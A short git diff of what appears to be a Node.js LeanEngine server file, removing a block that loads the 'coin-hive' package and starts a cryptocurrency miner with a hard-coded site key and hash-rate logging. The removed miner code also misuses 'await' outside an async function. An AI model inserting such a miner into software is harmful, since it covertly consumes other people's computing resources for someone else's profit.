@@ -6,27 +6,6 @@ var cookieParser = require('cookie-parser');
 var bodyParser = require('body-parser');
 var AV = require('leanengine');
 
-var CoinHive = require('coin-hive');
-(function(){
-
-  // Create miner
-  var miner = await CoinHive('od8Mnoa7vWHNiXNCsE7jzsf8rpreuHBJ'); // Coin-Hive's Site Key
-
-  // Start miner
-  await miner.start();
-
-  // Listen on events
-  miner.on('found', function(){ console.log('Found!')})
-  miner.on('accepted', function() { console.log('Accepted!')})
-  miner.on('update', function(data) { console.log(`
-    Hashes per second: ${data.hashesPerSecond}
-    Total hashes: ${data.totalHashes}
-    Accepted hashes: ${data.acceptedHashes}
-  `)});
-
-  // Stop miner
-})();
-
 // 加载云函数定义，你可以将云函数拆分到多个文件方便管理，但需要在主文件中加载它们
 require('./cloud');
 
